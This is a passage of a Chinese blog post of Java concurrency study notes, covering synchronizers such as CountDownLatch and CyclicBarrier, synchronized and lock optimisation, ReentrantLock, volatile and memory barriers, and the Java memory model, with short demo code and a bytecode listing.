class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CountDownLatch"><a href="#CountDownLatch" class="headerlink" title="CountDownLatch"></a>CountDownLatch</h3><p>允许一个或多个线程等待直到在其他线程中执行的一组操作完成的同步辅助;CAS思想;减法计数器;可以一个线程里countdown很多次，不一定要在多个线程里；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">countDownLatch.countDown(); <span class="comment">// 数量-1</span></span><br><span class="line">        countDownLatch.await(); <span class="comment">// 等待计数器归零,然后向下执行</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="CyclicBarrier"><a href="#CyclicBarrier" class="headerlink" title="CyclicBarrier"></a>CyclicBarrier</h3><p>加法计数器,底层使用reentrantlock, 如果计数器到达了设置值,则会新建一个线程去执行;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> add;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.BrokenBarrierException;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CyclicBarrier;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Huang Mingwang</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@create</span> 2021-04-26 4:10 下午</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CyclicBarrierDemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">CyclicBarrier</span> <span class="variable">success</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CyclicBarrier</span>(<span class="number">8</span>, () -&gt; &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">7</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">Thread</span>(()-&gt;&#123;</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;收集&quot;</span>+temp+<span class="string">&quot;个龙珠&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// 等到7个然后执行success</span></span><br><span class="line">                    success.await();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (BrokenBarrierException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Semaphore-类"><a href="#Semaphore-类" class="headerlink" title="Semaphore(类)"></a>Semaphore(类)</h3><p>底层CAS</p>
<h3 id="ReadWriteLock-接口"><a href="#ReadWriteLock-接口" class="headerlink" title="ReadWriteLock(接口)"></a>ReadWriteLock(接口)</h3><p>读可以多线程同时读,写只能一个写;读锁是为了防止读的时候有线程写入; ReentrantReadWriteLock()默认读优先,对写不公平;</p>
<h3 id="BlockingQueue-接口"><a href="#BlockingQueue-接口" class="headerlink" title="BlockingQueue(接口)"></a>BlockingQueue(接口)</h3><p>多线程,线程池会使用; </p>
<p>add() 可能报IllegalStateException异常, remove() 可能报NoSuchElementException异常,有返回值抛异常; </p>
<p>offer(), poll()有返回值,不抛异常 , offer(d, 2,TimeUnit.SECONDS), poll(2, TImeUnit.SECONDS) 可以设置等待时间;</p>
<p> element() peek()返回队首元素; </p>
<p> put(), take() 会等待,直到能操作成功;  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        ArrayBlockingQueue&lt;Object&gt; objects = <span class="keyword">new</span> <span class="title class_">ArrayBlockingQueue</span>&lt;&gt;(<span class="number">3</span>);</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">        System.out.println(objects.add(<span class="string">&quot;a&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//java.lang.IllegalStateException: Queue full</span></span><br><span class="line"><span class="comment">//java.util.NoSuchElementException</span></span><br></pre></td></tr></table></figure>

<h3 id="SynchronizedQueue-类"><a href="#SynchronizedQueue-类" class="headerlink" title="SynchronizedQueue(类)"></a>SynchronizedQueue(类)</h3><p>没有容量, 进去一个元素, 必须等待取出来之后,才能再往里面放一个元素; put() take(); </p>
<h2 id="Synchronized"><a href="#Synchronized" class="headerlink" title="Synchronized"></a>Synchronized</h2><p><a href="https://blog.csdn.net/u012403290/article/details/64910926">https://blog.csdn.net/u012403290/article/details/64910926</a></p>
<p>必须可重入，例如子类重写父类方法，都加了synchronized，这个时候子类方法里会调用super（）方法，如果不可重入就会死锁；最好不要锁string字符串；</p>
<p>jdk早期版本属于重量级锁; 可重入锁;JVM层面; 非公平锁; 内置关键字,隐形锁;线程异常时自动释放锁,不会发生死锁; 非中断锁,必须等线程执行完才释放锁; 代码块同步: 通过使用monitorenter和monitorexit指令实现的; 同步方法: ACC_SYNCHRONIZED修饰;有对象锁和类锁（static方法和class上枷锁）区分，两者不冲突可以并行存在; </p>
<p>synchronized关键字与wait()和notify()&#x2F;notifyAll()方法相结合可以实现等待&#x2F;通知机制;</p>
<p> wait()和notify()只能在同步代码块中使用;</p>
<p>监视器锁（monitor）是依赖于底层的操作系统的 Mutex Lock 来实现的，Java 的线程是映射到操作系统的原生线程之上的。如果要挂起或者唤醒一个线程，都需要操作系统帮忙完成，而操作系统实现线程之间的切换时需要从用户态转换到内核态，这个状态之间的转换需要相对比较长的时间，时间成本相对较高。庆幸的是在 Java 6 之后 Java 官方对从 JVM 层面对 synchronized 较大优化，所以现在的 synchronized 锁效率也优化得很不错了.</p>
<h3 id="深入分析wait-x2F-notify为什么要在同步块内"><a href="#深入分析wait-x2F-notify为什么要在同步块内" class="headerlink" title="深入分析wait&#x2F;notify为什么要在同步块内"></a>深入分析wait&#x2F;notify为什么要在同步块内</h3><p><a href="https://blog.csdn.net/lsgqjh/article/details/61915074">https://blog.csdn.net/lsgqjh/article/details/61915074</a></p>
<p>notify不释放锁，得让你自己wait释放锁，才能notify</p>
<p>Java API 强制要求这样做，如果你不这么做，你的代码会抛出IllegalMonitorStateException 异常。还有一个原因是为了避免 wait 和 notify之间产生竞态条件,生产者线程向缓冲区中写入数据，消费者线程从缓冲区中读取数据。消费者线程需要等待直到生产者线程完成一次写入操作。</p>
<p>生产者线程需要等待消费者线程完成一次读取操作。假设wait(),notify(),notifyAll()方法不需要加锁就能够被调用。此时消费者线程调用wait()正在进入状态变量的等待队列(译者注:可能还未进入)。在同一时刻，生产者线程调用notify()方法打算向消费者线程通知状态改变。那么此时消费者线程将错过这个通知并一直阻塞。因此，对象的wait(),notify(),notifyAll()方法必须在该对象的同步方法或同步代码块中被互斥地调用。</p>
<h3 id="虚假唤醒问题"><a href="#虚假唤醒问题" class="headerlink" title="虚假唤醒问题"></a>虚假唤醒问题</h3><p>当一个条件满足时，很多线程都被唤醒了，但是只有其中部分是有用的唤醒，其它的唤醒都是无用功；<br>比如买货：如果商品本来没有货物，突然进了一件商品，这是所有的线程都被唤醒了，但是只能一个人买，所以其他人都是假唤醒，获取不到对象的锁；</p>
<h4 id="虚假唤醒是如何产生的？"><a href="#虚假唤醒是如何产生的？" class="headerlink" title="虚假唤醒是如何产生的？"></a>虚假唤醒是如何产生的？</h4><p>　　把 while (number !&#x3D; 0) {}</p>
<p>　　换成 if (number &#x3D;&#x3D; 0) {}</p>
<p>　　就会出现虚假唤醒。官方文档有标注；</p>
<h4 id="为什么if判断会出现虚假唤醒？"><a href="#为什么if判断会出现虚假唤醒？" class="headerlink" title="为什么if判断会出现虚假唤醒？"></a>为什么if判断会出现虚假唤醒？</h4><p>  　　1. 因为if只会执行一次，执行完会接着向下执行if（）外边的</p>
<pre><code>　　2. 而while不会，直到条件满足才会向下执行while（）外边的
</code></pre>
<h3 id="8锁现象-关于锁的8个问题"><a href="#8锁现象-关于锁的8个问题" class="headerlink" title="8锁现象(关于锁的8个问题)"></a>8锁现象(关于锁的8个问题)</h3><h3 id="synchronized优化"><a href="#synchronized优化" class="headerlink" title="synchronized优化"></a>synchronized优化</h3><p>锁的四种状态: 无锁状态,偏向锁状态,轻量级锁状态,重量级锁;锁可以升级,但不能降级;</p>
<p>偏向锁是针对于一个线程而言的, 线程获得锁之后就不会再有解锁等操作了,假如有两个线程来竞争该锁的话, 那么偏向锁就失效了, 进而升级成轻量级锁了.因为大部分情况下, 都会是同一个线程进入同一块同步代码块的. 这也是为什么会有偏向锁出现的原因.在Jdk1.6中, 偏向锁的开关是默认开启的, 适用于只有一个线程访问同步块的场景. -XX:BiasedLockingStartupDelay&#x3D;0来关闭偏向锁的启动延迟, 也可以使用-XX:-UseBiasedLocking&#x3D;false来关闭偏向锁, 那么程序会直接进入轻量级锁状态.</p>
<p>轻量级锁: CAS思想;竞争的线程不会阻塞, 提高了程序的响应速度;如果始终得不到锁竞争的线程, 使用自旋会消耗CPU;</p>
<p>重量级锁: 线程竞争不适用自旋, 不会消耗CPU;线程堵塞, 响应时间缓慢</p>
<h4 id="锁消除"><a href="#锁消除" class="headerlink" title="锁消除"></a>锁消除</h4><p>锁消除是指对于被检测出不可能存在竞争的共享数据的锁进行消除。<br>锁消除主要是通过逃逸分析来支持，如果堆上的共享数据不可能逃逸出去被其它线程访问到，那么就可以把它们当成私有数据对待，也就可以将它们的锁进行消除。对于一些看起来没有加锁的代码，其实隐式的加了很多锁。例如下面的字符串拼接代码就隐式加了锁：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">concatString</span><span class="params">(String s1, String s2, String s3)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> s1 + s2 + s3; </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// String 是一个不可变的类，编译器会对 String 的拼接自动优化。在 JDK 1.5 之前，会转化为 StringBuffer 对象的连续 append() 操作：</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">concatString</span><span class="params">(String s1, String s2, String s3)</span> &#123; </span><br><span class="line">    <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(); </span><br><span class="line">    sb.append(s1); </span><br><span class="line">    sb.append(s2); </span><br><span class="line">    sb.append(s3); </span><br><span class="line">    <span class="keyword">return</span> sb.toString(); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 每个 append() 方法中都有一个同步块。虚拟机观察变量 sb，很快就会发现它的动态作用域被限制在 concatString() 方法内部。也就是说，sb 的所有引用永远不会逃逸到 concatString() 方法之外，其他线程无法访问到它，因此可以进行消除。</span></span><br></pre></td></tr></table></figure>

<h4 id="锁粗化"><a href="#锁粗化" class="headerlink" title="锁粗化"></a>锁粗化</h4><p>如果一系列的连续操作都对同一个对象反复加锁和解锁，频繁的加锁操作就会导致性能损耗。<br>上一节的示例代码中连续的 append() 方法就属于这类情况。如果虚拟机探测到由这样的一串零碎的操作都对同一个对象加锁，将会把加锁的范围扩展（粗化）到整个操作序列的外部。对于上一节的示例代码就是扩展到第一个 append() 操作之前直至最后一个 append() 操作之后，这样只需要加锁一次就可以了。</p>
<h2 id="Lock"><a href="#Lock" class="headerlink" title="Lock"></a>Lock</h2><p>conditon代替对象监视器; await , signal,只能在同步代码块中使用;</p>
<h2 id="ReentrantLock"><a href="#ReentrantLock" class="headerlink" title="ReentrantLock"></a>ReentrantLock</h2><p>显性锁,可重入锁; JDK 层面实现的（也就是 API 层面，需要 lock() 和 unlock() 方法配合 try&#x2F;finally 语句块来完成); 等待可中断; 可实现公平锁(默认是非公平的); 底层是CAS乐观锁，依赖AbstractQueuedSynchronizer类，把所有的请求线程构成一个CLH队列。而对该队列的操作均通过Lock-Free（CAS）操作; 适合锁大量的代码块;</p>
<h2 id="可重入锁、读写锁、公平锁、可中断锁"><a href="#可重入锁、读写锁、公平锁、可中断锁" class="headerlink" title="可重入锁、读写锁、公平锁、可中断锁"></a>可重入锁、读写锁、公平锁、可中断锁</h2><h5 id="可重入锁"><a href="#可重入锁" class="headerlink" title="可重入锁"></a>可重入锁</h5><p>Synchronized和ReentrantLook都是可重入锁，锁的可重入性标明了锁是针对线程分配方式而不是针对方法。例如调用Synchronized方法A中可以调用Synchronized方法B，而不需要重新申请锁。</p>
<h5 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h5><p>按照数据库事务隔离特性的类比读写锁，在访问统一个资源（一个文件）的时候，使用读锁来保证多线程可以同步读取资源。ReadWriteLock是一个读写锁，通过readLock()获取读锁，通过writeLock()获取写锁。</p>
<h5 id="可中断锁"><a href="#可中断锁" class="headerlink" title="可中断锁"></a>可中断锁</h5><p>可中断是指锁是可以被中断的，Synchronized内置锁是不可中断锁，ReentrantLock可以通过lockInterruptibly方法中断显性锁。例如线程B在等待等待线程A释放锁，但是线程B由于等待时间太久，可以主动中断等待锁。</p>
<h5 id="公平锁"><a href="#公平锁" class="headerlink" title="公平锁"></a>公平锁</h5><p>多个线程按照申请锁的顺序去获得锁，线程会直接进入队列去排队，永远都是队列的第一位才能得到锁。synchronized隐性锁是非公平锁，它无法保证等待的线程获取锁的顺序，ReentrantLook可以自己控制是否公平锁。公平锁先来后到,对短任务不友好,所以默认非公平锁,可以插队; </p>
<p>优点：所有的线程都能得到资源，不会饿死在队列中。</p>
<p>缺点：吞吐量会下降很多，队列里面除了第一个线程，其他的线程都会阻塞，cpu唤醒阻塞线程的开销会很大, 对短任务不友好;</p>
<h5 id="非公平锁"><a href="#非公平锁" class="headerlink" title="非公平锁"></a>非公平锁</h5><p>多个线程去获取锁的时候, 会直接去尝试获取,获取不到,再去进入到等待队列, 如果能获取到, 就直接获取到锁.</p>
<p>优点:  可以减少CPU唤醒线程的开销, 整体的吞吐效率会高点, CPU也不必唤醒所有线程, 会减少唤起线程的数量;</p>
<p>缺点:  容易饿死, 可能会导致线程中间的线程一直获取不到锁或者长时间获取不到锁,导致饿死.这么多个线程应cas去尝试会浪费cpu;</p>
<h2 id="Synchronized和Lock比较"><a href="#Synchronized和Lock比较" class="headerlink" title="Synchronized和Lock比较"></a>Synchronized和Lock比较</h2><ul>
<li>Synchronized是关键字，内置语言实现，Lock是接口。</li>
<li>Synchronized在线程发生异常时会自动释放锁，因此不会发生异常死锁。Lock异常时不会自动释放锁，所以需要在finally中实现释放锁。</li>
<li>Lock是可以中断锁，Synchronized是非中断锁，必须等待线程执行完成释放锁。</li>
<li>Lock可以使用读锁提高多线程读效率。</li>
</ul>
<h2 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848702.png" alt="image-20210605202825290"></p>
<p><a href="https://www.cnblogs.com/yaowen/p/11240540.html">https://www.cnblogs.com/yaowen/p/11240540.html</a></p>
<p> 可见性,不保证原子性,禁止指令重排;</p>
<p>指令重排: 源代码- 编译器优化重排-指令并行也可能会重排-内存系统也会重排-执行; 在DCL单例模式用的多;</p>
<p>volatile作用：</p>
<p>1.锁总线，其它CPU对内存的读写请求都会被阻塞，直到锁释放，不过实际后来的处理器都采用锁缓存替代锁总线，因为锁总线的开销比较大，锁总线期间其他CPU没法访问内存</p>
<p>2.lock后的写操作会回写已修改的数据，同时让其它CPU相关缓存行失效，从而重新从主存中加载最新的数据</p>
<p>3.<strong>不是内存屏障却能完成类似内存屏障的功能，阻止屏障两遍的指令重排序</strong></p>
<p>被volatile修饰的变量在编译成字节码文件时会多个lock指令，该指令在执行过程中会生成相应的<strong>内存屏障</strong>，以此来解决可见性跟重排序的问题。</p>
<p>内存屏障的作用：<br>1.在有内存屏障的地方，会禁止指令重排序，即屏障下面的代码不能跟屏障上面的代码交换执行顺序。<br>2.在有内存屏障的地方，线程修改完共享变量以后会马上把该变量从本地内存写回到主内存，<strong>并且让其他线程本地内存中该变量副本失效（使用MESI协议）</strong></p>
<p>JSR内存屏障可以被分为以下几种类型(JVM的要求, 具体hotpsot使用lock机制来实现)<br><strong>LoadLoad屏障：</strong>对于这样的语句Load1; LoadLoad; Load2，在Load2及后续读取操作要读取的数据被访问前，保证Load1要读取的数据被读取完毕。<br><strong>StoreStore屏障：</strong>对于这样的语句Store1; StoreStore; Store2，在Store2及后续写入操作执行前，保证Store1的写入操作对其它处理器可见。<br><strong>LoadStore屏障：</strong>对于这样的语句Load1; LoadStore; Store2，在Store2及后续写入操作被刷出前，保证Load1要读取的数据被读取完毕。<br><strong>StoreLoad屏障：</strong>对于这样的语句Store1; StoreLoad; Load2，在Load2及后续所有读取操作执行前，保证Store1的写入对所有处理器可见。它的开销是四种屏障中最大的。     在大多数处理器的实现中，这个屏障是个万能屏障，兼具其它三种内存屏障的功能。</p>
<p>为了实现volatile的内存语义，编译器在生成字节码时，会在指令序列中插入内存屏障来禁止特定类型的处理器重排序。对于编译器来说，发现一个最优布置来最小化插入屏障的总数几乎不可能，为此，JMM采取保守策略。下面是基于保守策略的JMM内存屏障插入策略：</p>
<ol>
<li>在每个volatile写操作的前面插入一个StoreStore屏障。</li>
<li>在每个volatile写操作的后面插入一个StoreLoad屏障。</li>
<li>在每个volatile读操作的后面插入一个LoadLoad屏障。</li>
<li>在每个volatile读操作的后面插入一个LoadStore屏障。</li>
</ol>
<p>上述内存屏障插入策略非常保守，但它可以保证在任意处理器平台，任意的程序中都能得到正确的volatile内存语义。</p>
<p>volatile关键字修饰的变量会存在一个lock:的前缀; </p>
<p>Lock前缀,lock不是一种内存屏障,但是它能完成内存屏障的功能. lock会对CPU总线和高速缓存行加锁,可以理解为CPU指令级的锁. 类似于lock指令. 在具体执行上, 它先对总线和缓存加锁,然后执行后面的指令, 在lock锁住总线的时候,其他cpu读写请求都会被阻塞, 直到锁被释放. 最后释放锁后会把高速缓存中的脏数据全部刷新回主内存, 且这个写回内存的操作会使在其他cpu里缓存了该地址的数据无效.</p>
<p>当线程b发现对应地址的缓存行被锁了,等待锁的释放, 缓存一致性协议会保证它读取到最新的值(重新从主存中读取, 因为有总线锁,如果线程a还没写回,b无法读取内存的东西,总线被锁住了) </p>
<p> volatile是“轻量级”synchronized，保证了共享变量的“可见性”（JMM确保所有线程看到这个变量的值是一致的），当CPU写数据时，如果发现操作的变量是共享变量，即在其他CPU中也存在该变量的副本，会发出信号通知其他CPU将该变量的缓存行置为无效状态并且锁住缓存行，因此当其他CPU需要读取这个变量时，要等锁释放，并发现自己缓存行是无效的，那么它就会从内存重新读取。</p>
<p> volatile是“轻量级”synchronized，保证了共享变量的“可见性”（JMM确保所有线程看到这个变量的值是一致的），使用和执行成本比synchronized低，因为它不会引起线程上下文切换和调度。</p>
<hr>
<p>工作内存Work Memory其实就是对CPU寄存器和高速缓存的抽象，或者说每个线程的工作内存也可以简单理解为CPU寄存器和高速缓存。</p>
<h3 id="volatile无法保证共享变量i-线程安全原因-JVM字节码层面"><a href="#volatile无法保证共享变量i-线程安全原因-JVM字节码层面" class="headerlink" title="volatile无法保证共享变量i++线程安全原因(JVM字节码层面)"></a>volatile无法保证共享变量i++线程安全原因(JVM字节码层面)</h3><p>volatile是为了解决JMM带来的变量可见性问题。</p>
<p>如果共享变量i++也和局部变量i++的执行流程相同：直接将局部变量中i值自增加1，那么volatile不就能保证多线程数据安全了？众所周知，volatile无法保证原子性，它只保证可见性。来看看JVM的具体实现：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="comment">//行数2</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        i++;<span class="comment">//行数4</span></span><br><span class="line">    &#125;<span class="comment">//行数5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Compiled from <span class="string">&quot;Demo.java&quot;</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">  <span class="keyword">static</span> <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(java.lang.String[])</span>;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: getstatic     #<span class="number">2</span>   <span class="comment">// Field i:I    //获取静态共享变量i的值放入操作数栈顶</span></span><br><span class="line">       <span class="number">3</span>: iconst_1                           <span class="comment">//将整数1推到栈顶</span></span><br><span class="line">       <span class="number">4</span>: iadd                               <span class="comment">//将栈顶两int值相加并将结果压入栈顶</span></span><br><span class="line">       <span class="number">5</span>: putstatic     #<span class="number">2</span>   <span class="comment">// Field i:I    //将栈顶的值同步回主存</span></span><br><span class="line">       <span class="number">8</span>: <span class="keyword">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">4</span>: <span class="number">0</span>    <span class="comment">//共享变量i++，包含了0、3、4、5的代码执行</span></span><br><span class="line">      line <span class="number">5</span>: <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> &#123;&#125;;</span><br><span class="line">    Code:</span><br><span class="line">       <span class="number">0</span>: iconst_0</span><br><span class="line">       <span class="number">1</span>: putstatic     #<span class="number">2</span>   <span class="comment">// Field i:I</span></span><br><span class="line">       <span class="number">4</span>: <span class="keyword">return</span></span><br><span class="line">    LineNumberTable:</span><br><span class="line">      line <span class="number">2</span>: <span class="number">0</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>总结：static共享变量i++：分3步，一.获取变量i的值，二.值加1，三.加1后的值写回i中。伪代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> i;</span><br><span class="line">temp = temp + <span class="number">1</span>;</span><br><span class="line">i = temp;</span><br></pre></td></tr></table></figure>

<p>很明显了，原因就是java共享变量的运算操作符不是原子操作！（字节码层面。其实不够严谨，因为就算编译出来只有一条字节码指令，JVM解释器也会运行多行代码解释执行或即时编译器也会编译成多行本地机器码执行，使用 -XX:+PrintAssembly 参数输出反汇编来分析会更严谨些，但这里字节码层面已经足以说明问题）</p>
<p>多线程环境，假设A、B线程同时执行，都执行到了第二步，B线程先执行结束i&#x3D;1，因为变量i是volatile类型，所以B线程执行结束马上刷新工作线程中i&#x3D;1到主存，并且通知其它cpu中线程：主存中i的值更新了，使A工作线程中缓存的i失效。如果A线程这时候使用到变量i，就需要去主存重新copy一份副本到自己的工作内存。但是这时候A执行到了temp &#x3D; temp + 1，已经用临时变量temp记录了之前i的值，不需要再读取i的值了。所以，虽然变量i的值0在A的工作内存中确实失效了，但是值temp仍然是有效的，既然有效，A就会将第三步的结果i&#x3D;1再次写入主存，覆盖了之前B线程写入的值。这就是为什么volatile无法保证共享变量i++线程安全的原因。简单讲就是volatile关键字只保证了 “0: getstatic” 获取到的是主存中最新的值，不保证 “4: iadd” 执行时操作栈中的值是主存最新的。</p>
<p>其实，这些都是JMM Java内存模型带来的数据问题：可见性、有序性、原子性。volatile是JDK提供的解决JMM数据可见性的关键字（volatile还保证了有序性），JVM实现volatile内存可见性语义，上面反汇编得到的代码就是JVM的具体实现流程。</p>
<h3 id="JMM"><a href="#JMM" class="headerlink" title="JMM"></a>JMM</h3><p> java内存模型主要定义了各种变量的访问规则;</p>
<p>Java内存模型（Java Memory Model ,JMM）(指JDK5的新模型)就是一种符合内存模型规范的，屏蔽了各种硬件和操作系统的访问差异的，保证了Java程序在各种平台下对内存的访问都能保证效果一致的机制及规范。</p>
<p>Java内存模型规定了所有的变量都存储在主内存中，每条线程还有自己的工作内存，线程的工作内存中保存了该线程中是用到的变量的主内存副本拷贝，线程对变量的所有操作都必须在工作内存中进行，而不能直接读写主内存。不同的线程之间也无法直接访问对方工作内存中的变量，线程间变量的传递均需要自己的工作内存和主存之间进行数据同步进行。而JMM就作用于工作内存和主存之间数据同步过程。他规定了如何做数据同步以及什么时候做数据同步。<strong>JMM是一种规范，目的是解决由于多线程通过共享内存进行通信时，存在的本地内存数据不一致、编译器会对代码指令重排序、处理器会对代码乱序执行等带来的问题。</strong></p>
<p>在开发多线程的代码的时候，我们可以直接使用synchronized等关键字来控制并发，从来就不需要关心底层的编译器优化、缓存一致性等问题。所以，Java内存模型，除了定义了一套规范，还提供了一系列原语，封装了底层实现后，供开发者直接使用。</p>
<p>Jdk1.2之前,都是从主存中读取变量; 而在当前的 Java 内存模型下，线程可以把变量保存<strong>本地内存</strong>（比如机器的寄存器）中，而不是直接在主存中进行读写。这就可能造成一个线程在主存中修改了一个变量的值，而另外一个线程还继续使用它在寄存器中的变量值的拷贝，造成<strong>数据的不一致</strong>。</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848717.png" alt="JMM(Java内存模型)" style="zoom:50%;" />

<p>volatile指示JVM这个变量是共享且不稳定的,每次使用它都到主存中去读取; 防止指令重排;保证变量的可见性;</p>
<img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848004.png" alt="volatile关键字的可见性" style="zoom:50%;" />

<p>同步约定: 线程解锁前,必须把共享变量立刻刷回主存; 线程加锁前, 必须读取主存中的最新的值到工作内存中; 加锁和解锁是同一把锁; </p>
<p>8种操作</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211848038.png" alt="image-20210427084129374"></p>
<p>8种操作如下：</p>
<ul>
<li>lock(锁定)：作用于主内存，它把一个变量标记为一条线程独占状态；</li>
<li>read(读取)：作用于主内存，它把变量值从主内存传送到线程的工作内存中，以便随后的load动作使用；</li>
<li>load(载入)：作用于工作内存，它把read操作的值放入工作内存中的变量副本中；</li>
<li>use(使用)：作用于工作内存，它把工作内存中的值传递给执行引擎，每当虚拟机遇到一个需要使用这个变量的指令时候，将会执行这个动作；</li>
<li>assign(赋值)：作用于工作内存，它把从执行引擎获取的值赋值给工作内存中的变量，每当虚拟机遇到一个给变量赋值的指令时候，执行该操作；</li>
<li>store(存储)：作用于工作内存，它把工作内存中的一个变量传送给主内存中，以备随后的write操作使用；</li>
<li>write(写入)：作用于主内存，它把store传送值放到主内存中的变量中。</li>
<li>unlock(解锁)：作用于主内存，它将一个处于锁定状态的变量释放出来，释放后的变量才能够被其他线程锁定；</li>
</ul>
<p>Java内存模型还规定了执行上述8种基本操作时必须满足如下规则:</p>
<p>（1）不允许read和load、store和write操作之一单独出现（即不允许一个变量从主存读取了但是工作内存不接受，或者从工作内存发起会写了但是主存不接受的情况），以上两个操作必须按顺序执行，但没有保证必须连续执行，也就是说，read与load之间、store与write之间是可插入其他指令的。</p>
<p>（2）不允许一个线程丢弃它的最近的assign操作，即变量在工作内存中改变了之后必须把该变化同步回主内存。</p>
<p>（3）不允许一个线程无原因地（没有发生过任何assign操作）把数据从线程的工作内存同步回主内存中。</p>
<p>（4）一个新的变量只能从主内存中“诞生”，不允许在工作内存中直接使用一个未被初始化（load或assign）的变量，换句话说就是对一个变量实施use和store操作之前，必须先执行过了assign和load操作。</p>
<p>（5）一个变量在同一个时刻只允许一条线程对其执行lock操作，但lock操作可以被同一个条线程重复执行多次，多次执行lock后，只有执行相同次数的unlock操作，变量才会被解锁。</p>
<p>（6）如果对一个变量执行lock操作，将会清空工作内存中此变量的值，在执行引擎使用这个变量前，需要重新执行load或assign操作初始化变量的值。</p>
<p>（7）如果一个变量实现没有被lock操作锁定，则不允许对它执行unlock操作，也不允许去unlock一个被其他线程锁定的变量。</p>
<p>（8）对一个变量执行unlock操作之前，必须先把此变量同步回主内存（执行store和write操作）。</p>
<h3 id="并发编程的三个重要特性"><a href="#并发编程的三个重要特性" class="headerlink" title="并发编程的三个重要特性"></a>并发编程的三个重要特性</h3><p>原子性;可见性;有序性</p>
<h3 id="synchronized和volatile的区别"><a href="#synchronized和volatile的区别" class="headerlink" title="synchronized和volatile的区别"></a>synchronized和volatile的区别</h3><ul>
<li>volatile 关键字是线程同步的轻量级实现，所以volatile性能比synchronized关键字要好。但是volatile 关键字只能用于变量而 synchronized 关键字可以修饰方法以及代码块。</li>
<li>volatile 关键字能保证数据的可见性，但不能保证数据的原子性。synchronized 关键字两者都能保证。</li>
<li>volatile关键字主要用于解决变量在多个线程之间的可见性，而 synchronized 关键字解决的是多个线程之间访问资源的同步性。</li>
</ul>
<h2 id="CAS"><a href="#CAS" class="headerlink" title="CAS"></a>CAS</h2><p>java无法操作内存,Java可以调用c++, C++可以操作内存; java可以通过unsafe类操作内存;</p>
